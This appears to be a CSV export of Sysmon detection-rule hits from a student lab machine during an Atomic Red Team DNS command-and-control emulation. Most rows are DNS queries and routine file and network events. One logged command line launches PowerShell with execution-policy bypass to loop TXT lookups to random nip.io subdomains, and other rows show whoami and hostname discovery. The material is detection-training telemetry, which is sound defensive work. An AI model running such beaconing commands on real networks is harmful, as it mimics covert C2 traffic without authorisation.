"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174822,"Query: atomicredteam-843164.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.680","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174823,"Query: atomicredteam-43267.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.719","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174824,"Query: atomicredteam-320881.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.757","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174825,"Query: atomicredteam-470586.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.794","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:45.903 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174826,"Query: atomicredteam-514617.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.831","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:45.903 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174827,"Query: atomicredteam-751227.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.868","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:45.903 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174828,"Query: atomicredteam-468337.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:45.037","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:45.903 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174829,"Query: atomicredteam-936030.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:45.075","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:45.903 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174830,"Query: atomicredteam-63595.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:45.114","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:10.284 +01:00","Net Conn (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",3,"","","sysmon",173831,"Initiated: true ¦ Proto: tcp ¦ SrcIP: 192.168.201.128 ¦ SrcPort: 62678 ¦ SrcHost: DESKTOP-G2OBL3D.localdomain ¦ TgtIP: 13.107.139.11 ¦ TgtPort: 443 ¦ TgtHost: - ¦ User: DESKTOP-G2OBL3D\student ¦ Proc: C:\Users\student\AppData\Local\Microsoft\OneDrive\25.222.1112.0002\OneDrive.Sync.Service.exe ¦ PID: 1748 ¦ PGUID: E9F06A57-6287-694E-3202-000000002400","DestinationIsIpv6: false ¦ DestinationPortName: https ¦ RuleName: Usermode ¦ SourceIsIpv6: false ¦ UtcTime: 2025-12-26 10:26:08.997","Sysmon_3_Med_NetConn_RuleAlert.yml","e13c5fe0-73f1-4c0f-aef5-1bab99b4237b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:10.839 +01:00","Suspicious Execution of Hostname","low","DESKTOP-G2OBL3D","Sysmon",1,"Disc","T1082","sysmon",173832,"Cmdline: ""C:\WINDOWS\system32\HOSTNAME.EXE"" ¦ Proc: C:\Windows\System32\HOSTNAME.EXE ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7188 ¦ PGUID: E9F06A57-62C2-694E-3D02-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Hostname APP ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=0411E7CFE0D452AFE541C1EA45033168,SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9,IMPHASH=8CB84C534505B1E47EF25FA2CD9A16BB","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2161 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: hostname.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:26:10.819","proc_creation_win_hostname_execution.yml","cd4f18d8-b261-1a76-2600-f039cd6f0310","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:12.673 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173834,"Cmdline: ""powershell.exe"" & {for($i=0; $i -le 1000; $i++) { Resolve-DnsName -type \""""TXT\"""" \""""atomicredteam-$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.nip.io\"""" -QuickTimeout}} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:26:12.649","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:10.887 +01:00","Local Accounts Discovery","low","DESKTOP-G2OBL3D","Sysmon",1,"Disc","T1033 ¦ T1087.001","sysmon",173833,"Cmdline: ""C:\WINDOWS\system32\whoami.exe"" ¦ Proc: C:\Windows\System32\whoami.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1348 ¦ PGUID: E9F06A57-62C2-694E-3E02-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: whoami - displays logged on user information ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=956692DADC5B2CEB46E9219F7A5BEFFA,SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3,IMPHASH=E4464BCD92DF7AC69CCD074CB9C0EFED","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: whoami.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:26:10.883","proc_creation_win_susp_local_system_owner_account_discovery.yml","e149ce89-80e1-9461-ab1f-2c14cabd84c0","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:48.813 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174851,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_c3nil31a.jwy.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 4728 ¦ PGUID: E9F06A57-6323-694E-4B02-000000002400","CreationUtcTime: 2025-12-26 10:27:48.800 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:48.800","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:49.880 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175219,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_jjyeumxu.5bx.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","CreationUtcTime: 2025-12-26 10:29:49.854 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:49.854","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:10.300 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175446,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_us2ap5ub.t2w.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9956 ¦ PGUID: E9F06A57-63B1-694E-5F02-000000002400","CreationUtcTime: 2025-12-26 10:30:10.275 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:10.275","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:15.378 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175452,"Path: C:\Users\student\AppData\Local\Temp\3stwtxwi\3stwtxwi.cmdline ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9956 ¦ PGUID: E9F06A57-63B1-694E-5F02-000000002400","CreationUtcTime: 2025-12-26 10:30:15.342 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:15.342","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:16.440 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175457,"Path: C:\Users\student\AppData\Local\Temp\v5tccl0z\v5tccl0z.cmdline ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9956 ¦ PGUID: E9F06A57-63B1-694E-5F02-000000002400","CreationUtcTime: 2025-12-26 10:30:16.416 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:16.417","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:11.985 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174864,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Azure.Core.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:11.983 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:11.983","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:11.987 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174865,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\brotlicommon.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:11.985 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:11.985","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:11.987 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174866,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\brotlidec.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:11.985 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:11.985","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:11.987 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174867,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\brotlienc.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:11.985 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:11.985","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:11.987 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174868,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\CopilotNative.Core.Audio.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:11.985 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:11.987","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:11.994 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174869,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\CopilotNative.Core.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:11.987 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:11.987","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:11.994 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174870,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\CopilotNative.DesktopEnvironment.Contracts.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:11.987 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:11.987","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:11.994 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174871,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\CopilotNative.DesktopEnvironment.Windows.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:11.989 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:11.989","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:11.994 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174872,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\CopilotNative.PlatformSdk.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:11.989 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:11.989","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:11.995 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174873,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\CopilotNative.WExp.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:11.989 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:11.989","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:11.995 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174874,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\coreclr.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:11.989 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:11.991","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:11.995 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174875,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\cpprest_2_10.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:11.991 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:11.991","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:11.998 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174876,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\FileExplorerCommandHandler.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:11.991 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:11.991","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:11.998 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174877,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\hostfxr.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:11.991 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:11.991","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:11.998 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174878,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\hostpolicy.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:11.993 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:11.993","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:11.998 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174879,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\jsoncpp.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:11.993 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:11.993","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:11.999 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174880,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\libcrypto-3-x64.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:11.993 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:11.993","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:11.999 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174881,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\libssl-3-x64.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:11.995 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:11.995","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:11.999 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174882,"Rule: EXE ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\M365Copilot.exe ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:11.995 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:11.995","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:11.999 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174883,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\M365CopilotCSharp.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:11.995 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:11.995","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
